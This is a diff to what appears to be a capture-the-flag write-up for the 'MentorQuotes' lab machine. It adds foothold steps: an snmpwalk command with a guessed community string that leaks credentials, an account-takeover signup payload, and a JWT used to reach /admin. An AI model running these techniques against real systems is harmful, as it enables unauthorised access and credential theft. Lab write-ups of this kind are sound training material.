@@ -132,6 +132,24 @@ PORT   STATE SERVICE REASON         VERSION
 </ul>
 <pre tabindex="0"><code>james@mentorquotes.htb
 </code></pre><h2 id="foothold">Foothold</h2>
+<h3 id="intended-snmpwalk">Intended: snmpwalk</h3>
+<ul>
+<li>There is a snmp service running on the target, hence perform a snmpwalk and found a credential</li>
+</ul>
+<pre tabindex="0"><code>&gt; snmpwalk -v2c -c internal mentorquotes.htb
+
+iso.3.6.1.2.1.25.4.2.1.5.2045 = STRING: &#34;/usr/local/bin/login.py k******************3&#34;
+</code></pre><blockquote>
+<div id="password3"></div>
+<script type="text/javascript">
+    window.onload = showHidden("password3", "U2FsdGVkX1/Ev8QPgZPWHrZ5Ah+5r7KHy6h5eWKfFt4Df8cv8/icZgMrpvTWwUpJ",  2 );
+</script>
+
+</blockquote>
+<ul>
+<li>This is the credential for the user <code>james</code></li>
+</ul>
+<h3 id="unintedned-way-patched">Unintedned way: (Patched)</h3>
 <ul>
 <li>Tampering with the method: <code>http://api.mentorquotes.htb/docs#/Auth/create_user_auth_signup_post</code> with the following payload. We can register a user called <code>james</code> and provide our own email.</li>
 </ul>
@@ -140,10 +158,18 @@ PORT   STATE SERVICE REASON         VERSION
   &#34;username&#34;: &#34;james&#34;,
   &#34;password&#34;: &#34;test1234&#34;
 }
-</code></pre><ul>
+</code></pre><h3 id="login-as-james">Login as james</h3>
+<ul>
 <li>Now, we are able to login using <code>http://api.mentorquotes.htb/docs#/Auth/login_auth_login_post</code> with the same payload and receive a token</li>
 </ul>
-<pre tabindex="0"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW93LmNvbSJ9.uUc8K0Weo06PoaonawiZOo_wEcdQE8DWNSRXvrwSaGU
+<pre tabindex="0"><code># payload
+{
+  &#34;email&#34;: &#34;james@mentorquotes.htb&#34;,
+  &#34;username&#34;: &#34;james&#34;,
+  &#34;password&#34;: &#34;&lt;password&gt;&#34;
+}
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW93LmNvbSJ9.uUc8K0Weo06PoaonawiZOo_wEcdQE8DWNSRXvrwSaGU
 </code></pre><ul>
 <li>And, we can query the <code>/admin</code> section with the token just created</li>
 </ul>
